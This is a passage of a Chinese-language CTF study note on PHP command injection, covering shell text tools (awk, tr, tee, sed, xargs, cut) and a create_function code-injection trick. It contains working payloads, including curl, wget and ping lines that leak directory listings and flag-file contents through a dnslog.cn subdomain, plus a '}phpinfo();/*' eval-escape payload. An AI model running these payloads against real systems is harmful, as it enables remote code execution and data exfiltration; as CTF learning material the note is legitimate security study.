**对于带外命令，有时用ping不好使，可以用wget或curl**<br />shell_exec('curl `ls /`.x3c7at.dnslog.cn')<br />shell_exec('wget `ls /`.x3c7at.dnslog.cn')
:::

##### awk

[https://www.cnblogs.com/wangqiguo/p/5863266.html#_label0](https://www.cnblogs.com/wangqiguo/p/5863266.html#_label0)

- 它是文本处理命令

```shell
echo -e '11 22 33 44\naa bb cc dd' | awk '{print $3" "$2" "$1}'
输出：
33 22 11
cc bb aa
```

- 这里 | 的作用是 将前一个的输出作为下一个命令的输入

##### tr

[https://cloud.tencent.com/developer/article/1725968](https://cloud.tencent.com/developer/article/1725968)

```shell
echo "HELLO ITCAST" | tr 'A-Z' 'a-z' 
输出：
hello itcast 
```

- 把前面的字符串中的大写字母转成小写字母

```shell
echo aabbcc..#dd2 */dk4 | tr -d -c '0-9 \n'  
2 4
```

- -c 表示补集，-d表示删除。补集中包含了数字0~9、空格和换行符\n，所以没有被删除，其他字符全部被删除了。

##### 例题

### <br />

## ![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669263404214-371bac91-288e-478c-ba53-59d34108eda5.png#averageHue=%23fefdfd&clientId=u29acd7f1-1e00-4&from=paste&height=165&id=h3ZIg&originHeight=364&originWidth=2098&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49306&status=done&style=none&taskId=ud54831cb-50c6-4a4e-9e41-e5cf0b3293d&title=&width=953.6363429668526)

利用ping的原理就是DNS请求：
:::info
如果请求的目标不是ip地址而是域名，那么域名最终还要转化成ip地址，就肯定要做一次域名解析请求。那么假设我有个可控的二级域名，那么它发出三级域名解析的时候，我这边是能够拿到它的域名解析请求的，这就相当于可以配合DNS请求进行命令执行的判断，这一般就被称为dnslog。（要通过dns请求即可通过ping命令，也能通过curl命令，只要对域名进行访问，让域名服务器进行域名解析就可实现）
:::

[dnslog](http://www.dnslog.cn/)

```shell
F=`$F`; ping `nl flag.php | awk 'NR==15' | tr -d -c '[:lower:]'/'[:digit:]'/'-'`.oi9r87.dnslog.cn -c 1
```

- 注意最开始的空格，是为了在substr之后不报错，经过测试发现对于phpinfo()这样的函数，不受其它字符的干扰，但是`ls`;不行，只能严格按照这个格式执行
- 带出数据只能一排一排的带出
- 将nl的内容给awk，由于只能一排一排带，所以指定行号为15
- 将ask输出给tr，删除flag中除了小写字母、数字、- 的内容
- 用 . 命令拼接dnslog的域名
- -c 设置 ping 的次数，默认无限次，可选

### tee命令

[https://www.runoob.com/linux/linux-comm-tee.html](https://www.runoob.com/linux/linux-comm-tee.html)

:::info
tee指令会从标准输入设备读取数据，将其内容输出到标准输出设备，同时保存成文件
:::

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669274109649-2b88f7ff-faab-4037-81be-aab161c98455.png#averageHue=%23fefefe&clientId=uea03734a-8b28-4&from=paste&height=226&id=u75334d84&originHeight=498&originWidth=2232&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53477&status=done&style=none&taskId=uebb2a828-6820-43b3-9805-a21c964a05c&title=&width=1014.5454325557745)

- 由于是无回显命令exec，因此可以用tee命令

```shell
ls / | tee 1 //读取输入到1文件中
cat /flag | tee 2 
```

### sed命令

[https://www.runoob.com/linux/linux-comm-sed.html](https://www.runoob.com/linux/linux-comm-sed.html)<br />sed 可依照脚本的指令来处理、编辑文本文件。<br />Sed 主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等

```shell
sed -i 's/book/books/g' file
```

- 直接编辑文件选项-i，
- s是取代命令
- book要取代的字符串
- 用books替代
- /g全局搜索，替代所有
- file是操作的文件

#### xargs

:::info
指所以能用到xargs这个命令，关键是由于很多命令不支持 | 管道来传递参数，而日常工作中有有这个必要，所以就有了xargs命令，例如：<br />#这个命令是错误的<br />find /sbin -perm +700 |ls -l<br />#这样才是正确的<br />find /sbin -perm +700 |xargs ls -l
:::

- 一般情况下，处理文本的命令，例如sort、uniq、grep、awk、sed等命令均支持管道；像rm、ls这类的不是处理文本的命令均不支持管道

#### 例题

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669276524674-f8e2f463-5288-46bd-b5a5-f97ded4625f4.png#averageHue=%23fefefe&clientId=uea03734a-8b28-4&from=paste&height=225&id=u30ad7075&originHeight=494&originWidth=2220&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53419&status=done&style=none&taskId=u00a3d21a-9e87-4bb8-a82d-0d1c84881e2&title=&width=1009.0908872194532)

```shell
c=ls | xargs sed 's/die/echo/'
c=ls | xargs sed 's/exec/system/'
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669276261682-e59c0a14-9dfd-453f-b4e0-0e0e1a0ce4fb.png#averageHue=%23fefefe&clientId=uea03734a-8b28-4&from=paste&height=225&id=u07f0a390&originHeight=494&originWidth=2292&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54319&status=done&style=none&taskId=u87e0dda9-f4bf-4283-8ead-4548a9d37d2&title=&width=1041.8181592373815)

- 这样修改完，就可以执行了

### 命令盲注

#### shell中的if

`if [];then fi`

```shell
#!/bin/bash
a=$1
b=$2
if [ $a == $b ];then
   echo "a and b is equal"
fi
if [ $a != $b ];then
   echo "a and b is not equal"
fi
```

#### cut

[https://www.runoob.com/linux/linux-comm-cut.html](https://www.runoob.com/linux/linux-comm-cut.html)

- 从每一行剪切

```shell
who | cut -c 1 //获取第一个字符
```

#### 命令盲注脚本

### create_function

#### create_function函数

[https://www.php.net/manual/zh/function.create-function](https://www.php.net/manual/zh/function.create-function)
:::info
**create_function**(string $args, string $code): string

- 下面两段代码的执行效果是一样的
- **会在$code处执行eval**
  :::

```php
<?php
$newfunc = create_function('$a,$b', 'return "ln($a) + ln($b) = " . log($a * $b);');
echo $newfunc(2, M_E) . "\n";
?>
```

```php
<?php
$newfunc = function($a,$b) { return "ln($a) + ln($b) = " . log($a * $b); };
echo $newfunc(2, M_E) . "\n";
?>
```

#### 例题

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669518061296-8814df57-09d3-4c7c-a2c6-4da8543bd182.png#averageHue=%23fefefe&clientId=u20045c8e-efb5-4&from=paste&height=134&id=uaa980240&originHeight=295&originWidth=1078&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29172&status=done&style=none&taskId=uf1fe4413-160e-4bd5-9f22-9af84fba55a&title=&width=489.99998937953626)
:::info
$ctfshow('', $_GET['show']);<br />这种形式，想到用create_cunction
:::
payload是<br />`ctf=\create_function`，用命名空间绕过正则<br />`?show=}phpinfo();/*`

- **本质上还是可以把$code用eval执行**

这里的闭合的原因是：闭合大括号，注释后面的大括号，就可以命令执行了。

```php
<?php
\create_function('',$_GET['show']);//相当于
function /*匿名函数*/(){
	$_GET['show']
  //}phpinfo();/*
}
?>
```

# 